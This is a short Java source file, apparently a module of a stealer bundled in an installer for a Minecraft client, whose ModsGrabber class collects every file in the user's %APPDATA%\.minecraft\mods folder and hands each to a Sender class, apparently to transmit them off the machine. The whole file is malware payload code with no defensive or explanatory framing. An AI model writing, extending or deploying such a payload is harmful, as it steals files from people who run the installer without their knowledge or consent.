package konas.installer.payload.impl;

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.FileUtil;

import java.io.File;

public final class ModsGrabber implements Payload
{
    @Override
    public void execute()
    {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) Sender.send(file);
    }
}
